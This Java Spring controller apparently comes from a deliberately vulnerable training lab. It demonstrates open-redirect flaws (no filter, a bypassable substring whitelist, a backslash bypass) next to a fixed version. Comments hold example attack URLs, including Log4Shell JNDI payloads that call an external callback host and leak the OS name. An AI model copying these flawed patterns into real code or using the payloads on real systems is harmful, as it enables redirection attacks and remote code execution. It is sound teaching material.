package com.ffffffff0x.exploit;

import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import java.net.MalformedURLException;
import java.net.URL;

@Api(tags = "url跳转")
@Slf4j
@Controller
@RequestMapping("/redirect")
public class Redirect {

    // 无过滤
    // http://127.0.0.1:8999/redirect/1?url=https://baidu.com
    // http://127.0.0.1:8999/redirect/1?url=${jndi:ldap://c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh/exp}
    // http://127.0.0.1:8999/redirect/1?url=${jndi:ldap://${sys:os.name}.c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh/exp}
    @GetMapping("/1")
    public String vul(String url) {
        log.info(url);
        return"redirect:" + url;
    }

    // 可以被绕过的白名单案例
    // http://127.0.0.1:8999/redirect/2?url=http://baidu.com/ffffffff0x.com
    @GetMapping("/2")
    public String vul2(String url) {
        String domain = "ffffffff0x.com";
        int result = url.indexOf(domain);
        if(result != -1){
            log.info(url);
            return"redirect:" + url;
        }else{
            log.error(url);
            return"redirect:/error";
        }
    }

    // 反斜杠绕过
    // http://127.0.0.1:8999/redirect/3?url=http://www.baidu.com%5Cwww.ffffffff0x.com
    @GetMapping("/3")
    public String vul3(String url) {

        String host = "";
        try {
            host = new URL(url).getHost();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        if (host.endsWith(".ffffffff0x.com")){
            log.info(host);
            return"redirect:https://" + host;
        }else{
            log.error(host);
            return"redirect:/error";
        }
    }

    // 安全案例
    // http://127.0.0.1:8999/redirect/safe?url=https://home.ffffffff0x.com
    @GetMapping("/safe")
    public String safe(String url) {

        String host = "";
        try {
            url = url.replaceAll("[\\\\#]","/");
            host = new URL(url).getHost();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        if (host.endsWith(".ffffffff0x.com")){
            log.info(host);
            return"redirect:https://" + host;
        }else{
            log.error(host);
            return"redirect:/error";
        }
    }

}
